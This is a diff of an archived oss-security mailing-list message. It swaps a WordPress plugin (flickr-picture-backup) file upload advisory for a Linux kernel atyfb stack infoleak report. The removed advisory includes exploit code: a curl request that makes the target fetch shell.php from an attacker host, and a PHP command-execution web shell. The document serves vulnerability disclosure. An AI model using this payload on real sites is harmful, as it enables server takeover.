@@ -1,57 +1,18 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/04/30/4
-Message-id: <968B1E14-0721-4973-8564-EEA02685D040@me.com>
-Date: Sun, 30 Apr 2017 12:45:47 -0400
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Source Security <oss-security@...ts.openwall.com>
-Subject: Arbitrary file upload vulnerability in Wordpress plugin flickr-picture-backup v0.7
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/07/30/2
+Message-ID: <40339054.1134.15d91d384bc.Coremail.sohu0106@126.com>
+Date: Sun, 30 Jul 2017 12:49:04 +0800 (CST)
+From: sohu0106 <sohu0106@....com>
+To: oss-security@...ts.openwall.com
+Subject: Linux kernel: driver/video/fbdev/aty/atyfb_base.c: atyfb_ioctl() stack infoleak
 Content-Type: text/plain; charset=utf-8
 
-Title: Arbitrary file upload vulnerability in Wordpress plugin flickr-picture-backup v0.7
-Author: Larry W. Cashdollar, @_larry0
-Date: 2017-04-26
-CVE-ID:[CVE-2017-1002016]
-Download Site: https://wordpress.org/plugins/flickr-picture-backup/
-Vendor: http://daozhao.goflytoday.com/
-Vendor Notified: 2017-04-26
-Vendor Contact:
-Advisory: http://www.vapidlabs.com/advisory.php?v=190
-Description: Backup flickr’s picture which in page/post External links to flickr’s picture. 
-Vulnerability:
-The code in flickr-picture-download.php doesn't check to see if the user is authenticated or that they have permission to upload files.  It also doesn't check what type of file is being uploaded.
+driver/video/fbdev/aty/atyfb_base.c
 
-define('WP_ADMIN', TRUE);
-require_once('../../../wp-load.php');
-require_once(ABSPATH . 'wp-admin/includes/admin.php');
-//require_once("./flickr-picture-backup.php");
-//echo "flickr-picture-download.php";
-if($_GET["url"])
-{
-    $url = $_GET["url"];
-    $fl = wp_daozhao_download_flickr_picture($url);
-    if ( is_wp_error($fl) )
-    {
-		echo  "FALSE:" . $fl->get_error_message();
-    }
-    else
-    {
-        wp_daozhao_flickr_backupfile_exists($url,$returl);
-        echo "OK:" . $returl ;
-    }
-    //echo wp_daozhao_flickr_backup_urlpath();
-    //echo "OK";
-}
 
-Export: JSON TEXT XML
-Exploit Code:
-	• $ curl http://example.com/wp-content/plugins/flickr-picture-backup/flickr-picture-download.php -d "url=http://myhost/shell.php"
-	•  
-	• Where shell.php is code to print out php web shell code, something like:
-	•  
-	• <?php
-	• echo "<?php\n\$cmd=\$_GET['cmd'];\nsystem(\$cmd);\n?>\n";
-	• ?>
-	•  
-	• Upon exploitation your shell is in:
-	•  
-	• http://example.com/wp-content/uploads/flickr_backup/shell.php
+In atyfb_ioctl() structure atyclk is copied to userland with padding bytes after
+"vclk_post_div" field unitialized.  It leads to leaking of
+contents of kernel stack memory.  We have to initialize them to zero. or it will allows local users to obtain potentially sensitive information from kernel stack memory by reading a copy of this structure
+
+
+https://github.com/torvalds/linux/pull/441
